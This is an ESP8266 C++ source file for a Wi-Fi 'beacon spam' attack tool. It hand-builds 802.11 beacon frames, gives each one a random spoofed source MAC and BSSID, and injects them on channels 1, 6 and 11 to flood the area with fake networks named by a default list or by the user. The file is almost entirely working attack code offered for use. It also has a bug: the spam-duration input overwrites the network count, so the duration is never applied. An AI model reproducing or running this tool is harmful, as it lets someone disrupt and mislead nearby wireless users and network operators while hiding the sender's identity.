
#include "BeaconSpam.h"

extern "C" {
    #include "user_interface.h"
}

#define NUM_CHANNELS 3
#define NUM_SSIDS 10
#define WPA2 false


const uint8_t channels[] = {1, 6, 11}; // commonly used wifi channels on 2.4ghz
const char* ssids[] = {"0", "1", "2", "3", "4", "5", "6", "7", "8", "9"};

int arrayindex;
int packetsSent;
unsigned int lastTime;
bool spamming;
uint8_t menuChoice; // default is default attack
String customSSID; // custom SSID for the user to enter
uint8_t numSSID; // current number of fake SSIDS showing 
uint8_t numSSIDLimit; // how many fake SSIDS to show to create based on custom input
uint16_t attackTime;

//beacon packet header
uint8_t beaconPacket[128] = {  
    0x80, 0x00, //Frame Control 
    0x00, 0x00, //Duration
/*4*/   0xff, 0xff, 0xff, 0xff, 0xff, 0xff, //Destination address 
/*10*/  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, //Source address - overwritten later
/*16*/  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, //BSSID - overwritten to the same as the source address
/*22*/  0xc0, 0x6c, //Seq-ctl
//Frame body starts here
/*24*/  0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, //timestamp - the number of microseconds the AP has been active
/*32*/  0xFF, 0x00, //Beacon interval
/*34*/  0x21, 0x04, //Capability info
/* SSID */
/*36*/  0x00
    };                       

uint8_t postSSID[13] = {
        0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, //supported rate
        0x03, 0x01, 0x04
};

void beaconSpamSetup() {
    wifi_set_opmode(STATION_MODE);
    wifi_promiscuous_enable(1); 

    arrayindex = 0;
    packetsSent = 0;
    lastTime = millis();
    spamming = false;
    menuChoice = 1;
    numSSIDLimit = 0;
    numSSID = 0;
}

void sendBeacon(const char* ssid){
    int ssidSize = strlen(ssid);
    int packetSize = 38 + ssidSize + sizeof(postSSID);

    beaconPacket[37] = ssidSize;

    //copying SSID into packet an post SSID
    memcpy(&beaconPacket[38], ssid, ssidSize);
    memcpy(&beaconPacket[38 + ssidSize], postSSID, sizeof(postSSID));

    // Randomize SRC MAC
    for(int k=0; k< 6; k++){
        beaconPacket[10 + k] = beaconPacket[16 + k] = random(256);
    }

    //looping through every wifi channel
    for(int i=0; i < NUM_CHANNELS ; i++){
        wifi_set_channel(channels[i]);
        beaconPacket[50 + ssidSize] = channels[i];

        //send it out 3 times to be sure
        for(int i=0; i<3; i++){
            packetsSent += wifi_send_pkt_freedom(beaconPacket, packetSize, 0) == 0;  
            delay(1);
        }
        
    }
    
}

void defaultAttack(){
    sendBeacon(ssids[arrayindex]);
    arrayindex++;
    if(arrayindex >= NUM_SSIDS){arrayindex =0;}
}

void customAttack(){
    String newSSID = customSSID + " ";
    newSSID += numSSID;
    sendBeacon(&newSSID[0]);
    
    if(++numSSID >= numSSIDLimit){numSSID =0;}
}

void initAttack(){
    Serial.println("\nBeacon Spam Menu:\n");
    Serial.println("1: Default spam with ssids from file.");
    Serial.println("2: Custom SSID to spam.");

    while (!Serial.available()){}
    menuChoice = Serial.parseInt();

    if(menuChoice == 2){
        Serial.print("Enter Custom SSID to spam: ");
        while (!Serial.available()){}
        customSSID = Serial.readStringUntil('\n');

        Serial.print("# of networks spammed: ");
        while (!Serial.available()){}
        numSSIDLimit = Serial.parseInt();

        Serial.print("Spam Duration (seconds): ");
        while (!Serial.available()){}
        numSSIDLimit = Serial.parseInt();
    }
}

void beaconSpam() {
    
    if(!spamming){
        spamming = true;
        initAttack();
    }

    switch(menuChoice){
        case 1:
            defaultAttack(); break;
        case 2:
            customAttack(); break;
        default:
            Serial.println("Invalid Input");
            spamming = false;
            break;
    }

    if (millis() - lastTime > 2000){
        Serial.printf("Packets Sent: %d\n", packetsSent);
        lastTime = millis();
    }
}
